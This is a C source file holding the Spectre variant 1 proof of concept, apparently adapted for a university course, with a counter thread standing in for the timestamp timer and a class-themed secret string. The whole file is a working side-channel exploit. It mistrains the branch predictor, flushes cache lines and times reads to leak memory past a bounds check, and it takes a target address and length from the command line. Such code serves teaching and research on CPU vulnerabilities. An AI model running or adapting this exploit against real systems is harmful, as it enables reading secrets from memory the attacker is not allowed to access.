#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//#include "cpucounters.h"
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
 Compilation & Execution Instruction

 linux# gcc -std=c99 -march=native -pthread -O0 spectre.c -o spectre && ./spectre
 
 macos# clang -O0 spectre.c -o spectre && ./spectre

 ********************************************************************/

/********************************************************************
 Defaults

 These will likely require tuning per platform
********************************************************************/

/* Default =  80; assume cache hit if time <= threshold */
#define CACHE_HIT_THRESHOLD 40

/* Default = 999; attempts to hit cache */
#define MAX_TRIES 200

/********************************************************************
 Victim code.
 ********************************************************************/

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char secret[] = "The Magic Words are Dan Sorin is the best prof at Duke.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */

void victim_function(size_t x) {
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}

/********************************************************************
 Thread code
 ********************************************************************/

int counter_thread_ended = 0;
uint32_t counter = 0;

void *counter_function(void *x_void_ptr) {
  while (!counter_thread_ended) {
    counter++;
  }

  printf("counter thread finished\n");
  return NULL;
}

/********************************************************************
 Analysis code
 ********************************************************************/

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i;
  unsigned int junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  volatile uint8_t *addr;

  for (i = 0; i < 256; i++)
    results[i] = 0;
  for (tries = MAX_TRIES; tries > 0; tries--) {
    /* Flush array2[256*(0..255)] from cache */
    for (i = 0; i < 256; i++)
      _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

    /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x)
     */
    training_x = tries % array1_size;
    for (j = 29; j >= 0; j--) {
      _mm_clflush(&array1_size);
      for (volatile int z = 0; z < 100; z++) {
      } /* Delay (can also mfence) */

      /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
      /* Avoid jumps in case those tip off the branch predictor */
      x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
      x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
      x = training_x ^ (x & (malicious_x ^ training_x));

      /* Call the victim! */
      victim_function(x);
    }

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &array2[mix_i * 512];
      // time1 = __rdtsc(); /* READ TIMER */
      time1 = counter; /* READ TIMER */
      junk = *addr;    /* MEMORY ACCESS TO TIME */
      // time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      time2 = counter - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit - add +1 to score for this value */
    }

    /* Locate highest & second-highest results results tallies in j/k */
    j = k = -1;
    for (i = 0; i < 256; i++) {
      if (j < 0 || results[i] >= results[j]) {
        k = j;
        j = i;
      } else if (k < 0 || results[i] >= results[k]) {
        k = i;
      }
    }
    if (results[j] >= (2 * results[k] + 5) ||
        (results[j] == 2 && results[k] == 0))
      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t)j;
  score[0] = results[j];
  value[1] = (uint8_t)k;
  score[1] = results[k];
}

int main(int argc, const char **argv) {
  size_t malicious_x =
      (size_t)(secret - (char *)array1); /* default for malicious_x */
  int i, score[2], len = 55, selected_id = 0, not_selected_id = 1;
  char *not_selected_label = "second";
  char recovered_secret[sizeof(secret)] = "";
  uint8_t value[2];
  char value_normalised[2];

  printf("\n");
  printf("CACHE_HIT_THRESHOLD = %d\n", CACHE_HIT_THRESHOLD);
  printf("          MAX_TRIES = %d\n", MAX_TRIES);

  printf("\n");
  printf("          Size of secret is %lu\n", sizeof(secret));
  printf("Size of recovered_secret is %lu\n", sizeof(recovered_secret));

  printf("\n");
  printf(" Original secret: '%s'\n", secret);
  printf("Recovered secret: '%s'\n", recovered_secret);
  printf("\n");

  // Setup the counter thread
  pthread_t counter_thread;

  if (pthread_create(&counter_thread, NULL, counter_function, NULL)) {
    fprintf(stderr, "Error creating thread\n");
    return 1;
  }
  // End Setup

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
  if (argc == 3) {
    sscanf(argv[1], "%p", (void **)(&malicious_x));
    malicious_x -= (size_t)array1; /* Convert input value into a pointer */
    sscanf(argv[2], "%d", &len);
  }

  printf("Reading %d bytes:\n", len);
  while (--len >= 0) {
    printf("Reading at malicious_x = %p... ", (void *)malicious_x);
    readMemoryByte(malicious_x++, value, score);
    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));

    selected_id = 0;
    not_selected_id = 1;
    not_selected_label = "second";

    value_normalised[0] = (value[0] > 31 && value[0] < 127) ? value[0] : '?';
    value_normalised[1] = (value[1] > 31 && value[1] < 127) ? value[1] : '?';

    if (value_normalised[0] == '?' && value_normalised[1] != '?') {
      selected_id = 1;
      not_selected_id = 0;
      not_selected_label = "first";
    }

    recovered_secret[strlen(recovered_secret)] = value_normalised[selected_id];

    if (score[1] == 0) {
      printf("0x%02X=’%c’ score=%d ", value[selected_id],
             value_normalised[selected_id], score[selected_id]);
    } else {
      printf("0x%02X=’%c’ score=%d ", value[selected_id],
             value_normalised[selected_id], score[selected_id]);
      printf("(’%c|%c’ %6s: 0x%02X=’%c’ score=%d)", value_normalised[0],
             value_normalised[1], not_selected_label, value[not_selected_id],
             value_normalised[not_selected_id], score[not_selected_id]);
    }
    printf("\n");
  }

  // Start: Exit counter thread
  counter_thread_ended = 1;
  if (pthread_join(counter_thread, NULL)) {
    fprintf(stderr, "Error joining thread\n");
    return 2;
  }
  // End: Exit counter thread

  printf("\n");
  printf(" Original secret: '%s'\n", secret);
  printf("Recovered secret: '%s'\n", recovered_secret);
  printf("\n");

  return (0);
}